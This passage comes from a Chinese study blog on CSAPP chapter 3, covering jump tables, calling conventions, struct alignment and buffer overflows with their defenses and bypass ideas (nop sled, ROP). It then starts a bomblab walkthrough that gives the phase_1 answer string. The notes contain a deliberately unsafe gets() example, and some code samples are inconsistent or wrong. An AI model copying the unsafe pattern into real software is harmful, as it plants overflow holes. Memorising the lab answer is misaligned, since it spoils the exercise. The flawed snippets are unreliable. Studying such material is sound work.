个条件成立了，那么程序进行了 n+1 次判断。而 switch 语句在多数情况下（case语句超过四条，值的跨度小）并没有使用条件转移来区分各个值之间的跳转，当然它会区分一般值和默认值（default），一般值我们使用跳转表的形式实现。</p><p>比如如下的语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> test&#123;</span><br><span class="line">    <span class="keyword">long</span> val=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span>(n)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            val+=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            val-=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            val*=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            val-=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            val++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将它翻译为汇编语言之后可能会出现这样的逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.L1:</span><br><span class="line">.quad .L2</span><br><span class="line">.quad .L3</span><br><span class="line">.quad .L4</span><br><span class="line">.quad .L5</span><br><span class="line">.quad .L6</span><br><span class="line"></span><br><span class="line">test proc:</span><br><span class="line">movq $1,%rax</span><br><span class="line">subq $1,%rdi</span><br><span class="line">cmpq $3,%rdi</span><br><span class="line">ja L6</span><br><span class="line">jmp *.L1(,%rdi,8)</span><br><span class="line">L2:</span><br><span class="line">addq $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L3: </span><br><span class="line">subq $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L4:</span><br><span class="line">mul $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L5:</span><br><span class="line">div $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L6:</span><br><span class="line">addq $1,%rax</span><br><span class="line">end:</span><br><span class="line">ret</span><br><span class="line">test endp</span><br></pre></td></tr></table></figure><p>我们可以看到跳转表的一个优势所在，对于每一个条件，都可以只进行一次判断就跳转到指定位置运行，当然我们实际在用的时候，可能会出现空语句，或者是滑落的情况（即语句下面没有 break），如果出现滑落，我们就删除对应语句块的 jmp 命令，如果出现空语句（case 后面没有语句），我们不新增加标签，而是直接设置跳转表的位置为下一个有值的标签。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>过程是软件中一个很重要的抽象，它提供了一种封装代码的方式，用一组参数和返回值实现了某种功能，然后我们可以在程序中不同的地方调用这个函数。</p><h4 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h4><p>C 语言调用机制的一个关键特性就是使用了栈结构提供的后进先出的管理原则。当 P 调用 Q 的时候，我们需要暂时保存 P 函数调用之前的一个状态，在调用完成之后予以恢复状态，当然，除了 %rax 寄存器，因为它需要返回值。</p><p>当 x86-64 过程需要的局部变量超出了我们所可以使用的寄存器时，函数就会选择在栈上开辟空间用于保存局部变量，这个局部变量的部分以及一些被保存的寄存器部分就是我们这个函数的栈帧。</p><h4 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h4><p>在调用函数的时候，我们需要让 %rip 寄存器到我们调用的函数代码段，调用结束之后，我们又需要让它返回原来的函数，因此这里就需要我们的 CALL 指令，CALL 指令也是无条件跳转指令，只是在跳转之前会增加一步，将当前的 %rip 压入栈中，等到被调用函数执行 ret 指令的时候，栈会把栈顶所保存的 <strong>返回地址</strong> 给到 %rip 寄存器。</p><p>建议跟则书上的图走一遍会理解更深刻。</p><h4 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h4><p>调用过程的时候，我们除了要交与控制权以外，我们还需要给定对应的参数，因此这里我们需要知道给函数传递对应的参数的方法。</p><p>重要知识，建议背诵：<strong>x86-64架构的函数调用传递参数的方式为：前六个参数分别传递给寄存器 %rdi,%rsi,%rdx,%rcx,%r8,%r9，若还有剩余参数，剩余参数从右往左依次入栈。</strong></p><h4 id="栈上的局部存储"><a href="#栈上的局部存储" class="headerlink" title="栈上的局部存储"></a>栈上的局部存储</h4><p>除了寄存器不足以存放所有本地数据时会开栈空间来存放以外，如果对变量进行了引用，即取址操作（&amp;），这个变量也必须放入栈中，栈开辟的局部存储会在函数调用结束的时候被释放掉。</p><h4 id="寄存器的局部存储"><a href="#寄存器的局部存储" class="headerlink" title="寄存器的局部存储"></a>寄存器的局部存储</h4><p>一般情况下，如果局部变量比较少，局部变量都将被保存在寄存器当中，那么发生调用的时候，我们应该如何保存寄存器中的局部变量呢？第一种方法就是被调用函数不去动这些寄存器，调用结束之后那还是原来的值，也没有关系。但是如果被调用函数也需要使用这些寄存器呢？我们就只能先把它保存在栈中，等到结束的时候再去读取。</p><p>惯例中：%rbx,%rbp,%r12~%r15 被划分为被调用者保存寄存器，就是调用者不需要去管它，要相信被调函数会为你保存好这一切内容。当然其它的寄存器中，除了 %rsp 就都属于调用者需要保存的寄存器，被调函数在用这些寄存器的时候会认为调用者已经保存好了，自己无需保存可以直接修改寄存器。</p><h3 id="数组的分配与访问"><a href="#数组的分配与访问" class="headerlink" title="数组的分配与访问"></a>数组的分配与访问</h3><p>C语言的数组是一种将标量数据聚集为更大的数据类型的方式。</p><h4 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h4><p>数组 type A[n] 所占用的字节数 sizeof(A)=sizeof(type)<em>n，我们要访问 A[i] 时，实际是访问内存地址为 XA+i</em>sizeof(type) 的元素。</p><h4 id="指针运算"><a href="#指针运算" class="headerlink" title="指针运算"></a>指针运算</h4><p>C语言允许对指针直接运算，但是指针与整数的加减被重载过， p+i 相当于 Xp+i*sizeof(type) 的地址（Xp 表示数组 p 的基地址）。</p><h4 id="嵌套数组"><a href="#嵌套数组" class="headerlink" title="嵌套数组"></a>嵌套数组</h4><p>当我们定义了一个 int A[3][5] 时，相当于做了如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="keyword">row3_t</span>[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">row3_t</span> A[<span class="number">5</span>];</span><br></pre></td></tr></table></figure><p>对于数组 A[N][M] 来说，A[i][j] 相当于访问内存地址为 XA+i*sizeof(int)<em>M+j</em>sizeof(int) 的元素。</p><h3 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h3><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><p>C语言会用一个 Struct 声明创建一个数据类型，将可能不同类型的基本数据聚和到一个对象当中，用名字来引用结构的各个部分。编译器对结构体处理时会记录每个变量名在结构体当中的偏移，对应使用时找到相对应的内存地址取出元素。</p><p>对于 C 语言而言，为了方便内存管理会对数据类型做出这样的规定：大小为 n(n&lt;=8) 的数据必须对齐在地址为 n 的倍数上，如果当前地址不符合要求则会往后顺延，中间的内存可能会因为填充产生浪费。</p><p>考虑如下结构体的声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> i;<span class="comment">//+0 4</span></span><br><span class="line"><span class="keyword">char</span> c;<span class="comment">//+4 1</span></span><br><span class="line"><span class="keyword">int</span> j;<span class="comment">//+8 4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看似我们可以采取这样的一种形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> i;<span class="comment">//+0 4</span></span><br><span class="line"><span class="keyword">char</span> c;<span class="comment">//+4 1</span></span><br><span class="line"><span class="keyword">int</span> j;<span class="comment">//+5 4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们只需要花费 9 个字节的内存就可以分配完这个结构体。然而事实上为了方便内存管理，它会强制要求 int 对齐在 4 整倍的内存偏移量上面。</p><p>建议做一下例题 3.45，会对对齐这方面有更深的了解。</p><h3 id="将控制和数据结合起来"><a href="#将控制和数据结合起来" class="headerlink" title="将控制和数据结合起来"></a>将控制和数据结合起来</h3><p>到现在我们已经理解了数据和指令的基本操作，本节会详细讲述它们之间的一些详细应用，以及帮我们研究常见的缓冲区溢出漏洞及对应的对抗手段。</p><h4 id="理解指针"><a href="#理解指针" class="headerlink" title="理解指针"></a>理解指针</h4><p>指针是 C 语言的核心特色，它提供了直接对内存操作的一个手段。指针的类型表示了它指向的内存为什么数据类型，我们可以通过显式的强制转换来将一块内存数据以不同的形式表达出来。</p><p>我们来看看指针的特点</p><ul><li>每个指针都有一个值，指定了指向的对象的地址。</li><li>*操作对于指针变量来说，作用是根据指针的数据类型取值。</li><li>强制类型转换不会改变指针的任何值，只会改变它数据的显示方式</li><li>指针可以指向函数</li></ul><p>我们可以声明这样的一个函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type (*name)(arglist);</span><br></pre></td></tr></table></figure><p>注意星号和变量名一定要一起加一个括号，不然星号会和前面的数据类型结合，整个声明就变成了一个函数的声明</p><h4 id="GDB调试器"><a href="#GDB调试器" class="headerlink" title="GDB调试器"></a>GDB调试器</h4><p>GNU 调试器 GDB 提供了许多有用的特性，允许我们机器级分析，具体可以用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gdb file</span><br></pre></td></tr></table></figure><p>来进入 gdb shell 调试程序，输入 help 可以查看具体命令和效果，常见的有</p><table><thead><tr><th>命令</th><th>效果</th></tr></thead><tbody><tr><td>run</td><td>运行程序（在此给出参数）</td></tr><tr><td>quit</td><td>退出</td></tr><tr><td>kill</td><td>杀死程序</td></tr><tr><td>b xxx</td><td>下断点</td></tr><tr><td>delete</td><td>删除断点</td></tr><tr><td>s</td><td>单步运行</td></tr><tr><td>si</td><td>机器级单步运行</td></tr><tr><td>n</td><td>步过运行</td></tr><tr><td>ni</td><td>步过运行</td></tr><tr><td>c</td><td>继续运行</td></tr><tr><td>finish</td><td>步过运行直到ret</td></tr><tr><td>disass</td><td>查看反汇编代码</td></tr><tr><td>p</td><td>打印数据</td></tr><tr><td>info register</td><td>查看寄存器</td></tr><tr><td>help</td><td>调出手册</td></tr></tbody></table><h4 id="内存越界和缓冲区溢出"><a href="#内存越界和缓冲区溢出" class="headerlink" title="内存越界和缓冲区溢出"></a>内存越界和缓冲区溢出</h4><p>C在数组引用的时不会进行任何边界检查，而且局部变量和状态信息都存放在栈中，两者结合起来就会导致严重的程序错误，破坏栈中存储的信息，如果改变了尝试 ret 的位置，那么就会导致程序执行的位置发生非预期错误。</p><p>有一种特别常见的状态被称为 <strong>缓冲区溢出</strong>，通常是在我们在栈中分配字符数组的时候，输入的字符串超出了我们分配的大小。</p><p>比如这样第一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 gets 函数会读取一整行，直到遇到 \n 时才会停止读入，不做任何长度判断，因此这个函数是危险的。</p><p>我们编译出这个函数的汇编代码可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">endbr64</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">subq$16, %rsp</span><br><span class="line">leaq-8(%rbp), %rax</span><br><span class="line">movq%rax, %rdi</span><br><span class="line">movl$0, %eax</span><br><span class="line">callgets@PLT</span><br><span class="line">leaq-8(%rbp), %rax</span><br><span class="line">movq%rax, %rdi</span><br><span class="line">callputs@PLT</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>gets 函数的参数为 -8(%rbp) 也就是说超过8位之后，我们会覆盖到 rbp 所在的位置，如果再超过8个字节，那么就会覆盖到返回地址。</p><p>因此一般情况下我们不会使用 gets 函数去读入，这是不好的编程习惯。</p><p>缓冲区溢出更致命的一点就是让程序执行原本不会执行的函数，这是种比较常见的通过计算机网络攻击系统安全的方法。我们称编写攻击的脚本为 exploit code ，而我们直接输入的字节被称为 payload，一般情况下，攻击代码可能会尝试启动一个 shell 程序让攻击者获取对受害计算机直接操控的权限。</p><h4 id="对抗缓冲区溢出攻击"><a href="#对抗缓冲区溢出攻击" class="headerlink" title="对抗缓冲区溢出攻击"></a>对抗缓冲区溢出攻击</h4><p>我们有如下的几种方法：</p><ol><li>栈随机化</li><li>栈破坏检测</li><li>栈不可执行</li></ol><p>一般情况下，程序每次运行的虚拟地址都是固定不变的，这样会使得程序更容易遭受攻击，栈随机化使得每次程序运行时栈的位置都有变化，这类技术我们成为 <strong>地址空间布局随机化（Address-Space Layout Randomization）</strong> 当然，有防御，就会有攻击方法。我们只需要在缓冲区中插入比较多的 nop 指令，那么我们只要任意命中一个 nop 都可以导致我们恶意代码的顺利执行。这个序列的常用术语是 nop sled 差不多就是一直滑过去。如果随机化的可能性达到了 2^21，那么如果命中位置只有一个的话，我们就要赌这 2^(-21) 的概率，这显然不太能被接受，假如我们插入了 255 字节的 nop，那么我们任意命中 256 中的其中一个，我们都可以执行成功，概率直接缩小到 2^13，这个数字大小能稍微被接受了。</p><p>第二个思路是在造成严重的后果之前尽可能检测到栈溢出了，思想就是往返回地址之前插入一段随机数，在函数即将返回的时候，检查这段随机数是否被更改，如果被更改，调用 __stack_chk_fail 函数进行异常处理终止程序运行。一般这个随机数我们称为 canary（<strong>金丝雀</strong>，实际在下矿的时候主要用于探测煤矿是否有毒），现在的 gcc 版本默认添加 canary，但是我们可以通过参数 -fno-stack-protector 参数关闭这个保护。</p><p>第三个思路就是<strong>NX（NO EXECUTE）</strong>让栈中不可执行代码，我们往栈中插入代码的思想也就变的不可行了，但是我们仍然可以使用 ROP 的思想去绕过这一保护。</p><h2 id="CSAPP-bomblab"><a href="#CSAPP-bomblab" class="headerlink" title="CSAPP:bomblab"></a>CSAPP:bomblab</h2><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">实验文件下载</a></p><p>我们只需要下载 writeup（实验说明） 和 Self-Study Handout（自学附件）即可。</p><p>解压附件我们可以得到一个源文件和一个二进制文件，但是源文件并没有给全，只给了大概的程序逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bomb.c</span></span><br><span class="line"><span class="comment">/***************************************************************************</span></span><br><span class="line"><span class="comment"> * Dr. Evil&#x27;s Insidious Bomb, Version 1.1</span></span><br><span class="line"><span class="comment"> * Copyright 2011, Dr. Evil Incorporated. All rights reserved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LICENSE:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the</span></span><br><span class="line"><span class="comment"> * VICTIM) explicit permission to use this bomb (the BOMB).  This is a</span></span><br><span class="line"><span class="comment"> * time limited license, which expires on the death of the VICTIM.</span></span><br><span class="line"><span class="comment"> * The PERPETRATOR takes no responsibility for damage, frustration,</span></span><br><span class="line"><span class="comment"> * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other</span></span><br><span class="line"><span class="comment"> * harm to the VICTIM.  Unless the PERPETRATOR wants to take credit,</span></span><br><span class="line"><span class="comment"> * that is.  The VICTIM may not distribute this bomb source code to</span></span><br><span class="line"><span class="comment"> * any enemies of the PERPETRATOR.  No VICTIM may debug,</span></span><br><span class="line"><span class="comment"> * reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any</span></span><br><span class="line"><span class="comment"> * other technique to gain knowledge of and defuse the BOMB.  BOMB</span></span><br><span class="line"><span class="comment"> * proof clothing may not be worn when handling this program.  The</span></span><br><span class="line"><span class="comment"> * PERPETRATOR will not apologize for the PERPETRATOR&#x27;s poor sense of</span></span><br><span class="line"><span class="comment"> * humor.  This license is null and void where the BOMB is prohibited</span></span><br><span class="line"><span class="comment"> * by law.</span></span><br><span class="line"><span class="comment"> ***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;support.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;phases.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Note to self: Remember to erase this file so my victims will have no</span></span><br><span class="line"><span class="comment"> * idea what is going on, and so they will all blow up in a</span></span><br><span class="line"><span class="comment"> * spectaculary fiendish explosion. -- Dr. Evil </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">FILE *infile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note to self: remember to port this bomb to Windows and put a </span></span><br><span class="line"><span class="comment">     * fantastic GUI on it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with no arguments, the bomb reads its input lines </span></span><br><span class="line"><span class="comment">     * from standard input. */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span></span><br><span class="line"><span class="comment">     * until EOF, and then switches to standard input. Thus, as you </span></span><br><span class="line"><span class="comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span></span><br><span class="line"><span class="comment">     * avoid having to retype it. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">     * how to defuse this... */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment">     * confuse people. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Halfway there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So you got that one.  Try this one.\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Round and &#x27;round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good work!  On to the next...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This phase will never be used, since no one will get past the</span></span><br><span class="line"><span class="comment">     * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">     * something they overlooked?  Mua ha ha ha ha! */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>writeup 提示我们最好使用调试手段而是不要使用暴力手段，每一关我们都要有对应的正确输入才能保证炸弹不爆炸。</p><p>当然以现在的状态做这个实验就是小菜一碟。。</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>那我们还是走流程，先起 gdb 调试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gdb ./bomb</span><br></pre></td></tr></table></figure><p>一般选择 main 下断点，然后 r 去运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;b main</span><br><span class="line">pwndbg&gt;r</span><br></pre></td></tr></table></figure><p><img src="/2022/09/22/CSAPP_3/1.png" alt="1"></p><p>程序断在 main 函数的第一句中，这里我使用了插件 pwndbg，方便观察调试信息。</p><p>首先我们用 n 步过调试命令去运行到第一个函数 </p><p><img src="/2022/09/22/CSAPP_3/2.png" alt="2"></p><p>因为这里符号表是没有去的，我们在 gdb 里面还是可以看到这个函数名的，initialize_bomb 可以望文生义，就是初始化炸弹嘛。</p><p>然后接着步过运行过去，运行到 readline 之后发现程序停下，开始要接收我们的输入了，随便输入一串字符之后发现程序输出一段话之后就直接结束了，那么我们直接往回看一看，有一个 phase_1 函数，这里我们不用步过命令了，用 si 步进命令跟到函数里面，然后接着 n，运行之后发现有一个函数叫 string_not_equal </p><p><img src="/2022/09/22/CSAPP_3/3.png" alt="3"></p><p>并且 rdi 也就是第一个参数是我们所输入的字符串，第二个参数是一个字符串 </p><p>Border relations with Canada have never been better.</p><p>那么应该就是跟字符串比较的，当然我们输入的字符串肯定跟他们不一样，我们跳过之后发现函数返回值为 1，而后面 test eax,eax，并且为为零跳转。我们很清楚可以看到如果不跳转，下面就直接执行了 call explode_bomb，直接就爆炸，所以我们这里需要输入相等的字符串，成功过第一关</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>这里我们同样随便输入一串字符串，然后跟到 phase_2 函数里面，发现调用了一个 read_six_number 函数，这个函数干什么的已经是太明显了，就是要读取六个数字。</p><p>那么我们直接输入 6 个零跟进去看看</p><p><img src="/2022/09/22/CSAPP_3/4.png" alt="4"></p><p>这里 6 个数字很明显是存储在了栈上，那么这个地方拿栈中的数据和 